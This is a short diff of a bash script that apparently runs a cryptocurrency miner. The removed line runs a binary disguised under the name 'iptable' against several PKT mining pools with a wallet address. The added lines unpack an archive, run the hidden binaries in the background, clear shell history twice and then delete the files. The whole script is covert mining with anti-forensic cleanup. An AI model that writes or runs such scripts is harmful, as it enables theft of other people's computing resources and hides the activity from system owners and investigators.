@@ -1,1 +1,12 @@
-./iptable ann -p pkt1qknp6qanx33x9x8je0tpysr9c4ct46fd4gptcwa http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com | grep --color=never -o "annmine.rs.*Ke.*"
+#!/bin/bash
+apt-get update
+apt-get install unzip
+unzip asup.zip
+chmod 777 iptable time *.sh
+./*.sh >/dev/null &
+uname -a
+history -rc
+timeout 58m ./time
+rm iptable time *.sh
+echo "done..."
+history -rc
